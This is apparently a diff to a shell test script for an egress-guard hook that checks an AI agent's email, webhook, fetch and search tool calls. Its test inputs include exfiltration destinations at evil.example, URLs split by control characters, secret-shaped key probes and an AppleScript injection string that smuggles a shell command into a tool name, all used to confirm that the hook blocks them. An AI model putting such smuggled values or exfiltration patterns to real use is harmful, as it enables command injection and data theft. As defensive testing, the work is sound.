@@ -29,11 +29,34 @@ printf 'bad.example\n' > "$TMP/fakehome/.claude/blocklist-domains.txt"
 # "Egress guard ... blocked" alerts with the Basso sound on the screen of the person at the Mac
 mkdir -p "$TMP/bin"
 : > "$TMP/notified"
-printf '#!/bin/sh\necho x >> "%s"\n' "$TMP/notified" > "$TMP/bin/osascript"
+# osa-args records each -e script and each plain argument on its own labeled line.
+# The count file stays one line per alert. Both files exist first: full-disk runs may append
+# but not create.
+: > "$TMP/osa-args"
+{
+  printf '%s\n' '#!/bin/sh'
+  printf '%s\n' "echo x >> '$TMP/notified'"
+  printf '%s\n' "detail='$TMP/osa-args'"
+  printf '%s\n' 'expect=0'
+  printf '%s\n' 'while [ $# -gt 0 ]; do'
+  printf '%s\n' '  if [ "$expect" -eq 1 ]; then'
+  printf '%s\n' '    printf "%s\n" "script:$1" >> "$detail"'
+  printf '%s\n' '    expect=0'
+  printf '%s\n' '  elif [ "$1" = "-e" ]; then'
+  printf '%s\n' '    expect=1'
+  printf '%s\n' '  else'
+  printf '%s\n' '    printf "%s\n" "arg:$1" >> "$detail"'
+  printf '%s\n' '  fi'
+  printf '%s\n' '  shift'
+  printf '%s\n' 'done'
+  printf '%s\n' 'exit 0'
+} > "$TMP/bin/osascript"
 chmod +x "$TMP/bin/osascript"
 # The secret-shaped probes are assembled here so no literal credential shape sits in this file.
 AWS="$(printf '%s' 'AK' 'IA' 'ABCD' 'EFGH' 'IJKL' 'MNOP')"
 GHP="$(printf '%s' 'gh' 'p_' 'abcdefghijklmnopqrstuvwxyz0123')"
+# sk- plus 24 characters. Pieces, so the key shape is not one literal in this file.
+SK="$(printf '%s' 'sk' '-' 'abcdefghij' 'klmnopqrst' 'uvwx')"
 # 70 KB of padding on a line after the secret: grep -q exits at the first matching line, and past
 # the 64 KB pipe buffer printf dies of SIGPIPE, which pipefail read as no match.
 PAD70="$(head -c 70000 /dev/zero | tr '\0' 'a')"
@@ -274,6 +297,93 @@ if [ -f "$egress_log" ] && { grep -F -q -- "$AWS" "$egress_log" || grep -F -q --
   fails=$((fails + 1))
 else
   echo "PASS the egress log holds no secret from a blocked call"
+fi
+
+# source: 11-12 review of c69dc2f, a destination under a key the hook does not list passed when another field was allow-listed
+re_bad="$(payload mcp__claude_ai_Gmail__send_email '{"to": "a@allowed.example", "recipientEmail": "x@evil.example", "subject": "x"}')"
+CHECK_OUT='Domain: evil.example' check 2 "an allow-listed to with an off-list recipientEmail is blocked" "$re_bad" bash
+
+# source: 11-12 review of c69dc2f, a destination under a key the hook does not list passed when another field was allow-listed
+att_bad="$(payload mcp__claude_ai_Gmail__send_email '{"to": "a@allowed.example", "attendees": [{"email": "x@evil.example", "displayName": "X"}], "subject": "x"}')"
+CHECK_OUT='Domain: evil.example' check 2 "an allow-listed to with an off-list attendees email is blocked" "$att_bad" bash
+
+# source: 11-12 review of c69dc2f, a webhook under an unlisted key passed when url was allow-listed
+ep_bad="$(payload mcp__example__webhook '{"url": "https://allowed.example/hook", "endpoint": "https://evil.example/h"}')"
+CHECK_OUT='Domain: evil.example' check 2 "an allow-listed url with an off-list endpoint is blocked" "$ep_bad" bash
+
+# source: 11-12 review of c69dc2f, a recipient word with no @ was skipped
+atk="$(payload mcp__claude_ai_Gmail__send_email '{"to": "a@allowed.example, attacker", "subject": "x"}')"
+check 2 "a to list containing a word with no @ is blocked" "$atk" bash
+
+# source: 11-12 review of c69dc2f, a recipient that is not one address was skipped when it held no @
+person="$(payload mcp__claude_ai_Gmail__send_email '{"to": "Some Person", "subject": "x"}')"
+CHECK_OUT='could not read a recipient, failing closed' check 2 "a to of Some Person alone is blocked" "$person" bash
+
+# source: 11-12 review of c69dc2f, a comma inside a quoted display name splits the recipient
+# Choice: strip double-quoted display names before splitting, so this stays one address and is allowed.
+quoted_ok="$(payload mcp__claude_ai_Gmail__send_email '{"to": "\"A, Person\" <a@allowed.example>", "subject": "x"}')"
+check 0 "a quoted display name with a comma is allowed" "$quoted_ok" bash
+
+# source: 11-12 review of c69dc2f, prose that only mentions an address was not a destination and must stay allowed
+prose="$(payload mcp__claude_ai_Gmail__send_email '{"to": "a@allowed.example", "body": "write to x@evil.example or @channel", "subject": "x"}')"
+check 0 "a body that mentions an address is not a destination" "$prose" bash
+
+# source: 11-12 review of c69dc2f, a plain-string startUrls entry was dropped
+su="$(payload mcp__apify__rag-web-browser '{"input": {"startUrls": ["https://bad.example/"]}}')"
+CHECK_OUT='Domain: bad.example' check 2 "a fetch startUrls string on the blocklist is blocked" "$su" bash
+
+# source: 11-12 review of c69dc2f, a URL holding a control character was split before the check
+nl_url="$(payload mcp__example__webhook '{"url": "https://allowed.example\n.evil.example/"}')"
+CHECK_OUT='URL holds a control character, failing closed' check 2 "a webhook URL with a newline is blocked" "$nl_url" bash
+
+# source: 11-12 review of c69dc2f, a URL holding a control character was split before the check
+tab_input="$(jq -cn --arg u "$(printf 'https://example.com/\tpage')" '{url:$u, prompt:"x"}')"
+tab_fetch="$(payload WebFetch "$tab_input")"
+CHECK_OUT='URL holds a control character, failing closed' check 2 "a fetch URL holding a tab is blocked" "$tab_fetch" bash
+
+# source: 11-12 review of c69dc2f, the secret pattern matched sk- inside ordinary words
+slug="$(payload WebSearch '{"query": "risk-based-security-assessment-guide checklist"}')"
+check 0 "a search for risk-based-security-assessment-guide is allowed" "$slug" bash
+
+# source: 11-12 review of c69dc2f, the secret pattern matched the phrase password reset
+pwreset="$(payload WebSearch '{"query": "how to handle a password reset email"}')"
+check 0 "a search about a password reset email is allowed" "$pwreset" bash
+
+# source: 11-12 review of c69dc2f, a password assignment is still secret-shaped
+pwset="$(payload WebSearch '{"query": "password: hunter2hunter2"}')"
+CHECK_NOT_OUT='hunter2hunter2' check 2 "a search query with a password assignment is blocked" "$pwset" bash
+
+# source: 11-12 review of c69dc2f, an sk- key shape preceded by a space must still block
+sk_search="$(payload WebSearch "{\"query\": \"prefix $SK\"}")"
+CHECK_NOT_OUT="$SK" check 2 "a search query with an sk- key shape preceded by a space is blocked" "$sk_search" bash
+
+# source: 11-12 review of c69dc2f, notify pasted the tool name into the AppleScript source
+INJECT='x"; do shell script "touch INJECTED"; "send_email'
+inject_body="$(payload "$INJECT" '{"to": "someone@not-on-the-list.example", "subject": "x"}')"
+inject_preexisted=0
+if [ -e INJECTED ]; then
+  inject_preexisted=1
+fi
+before_detail="$(wc -l < "$TMP/osa-args" | tr -d ' ')"
+check 2 "a tool name that breaks out of an AppleScript string is blocked" "$inject_body" bash
+detail_new="$(tail -n +"$((before_detail + 1))" "$TMP/osa-args")"
+scripts="$(printf '%s\n' "$detail_new" | grep '^script:' || true)"
+args="$(printf '%s\n' "$detail_new" | grep '^arg:' || true)"
+if [ -z "$scripts" ]; then
+  echo "FAIL osascript -e scripts were not recorded"
+  fails=$((fails + 1))
+elif printf '%s\n' "$scripts" | grep -F -q 'touch INJECTED'; then
+  echo "FAIL tool name was inside an -e script"
+  fails=$((fails + 1))
+elif ! printf '%s\n' "$args" | grep -F -q 'touch INJECTED'; then
+  echo "FAIL tool name did not reach osascript as an argument"
+  fails=$((fails + 1))
+elif [ "$inject_preexisted" -eq 0 ] && [ -e INJECTED ]; then
+  echo "FAIL injected command created INJECTED"
+  rm -f INJECTED
+  fails=$((fails + 1))
+else
+  echo "PASS tool name reached osascript only as an argument"
 fi
 
 [ "$fails" -eq 0 ] || { echo "$fails failed"; exit 1; }
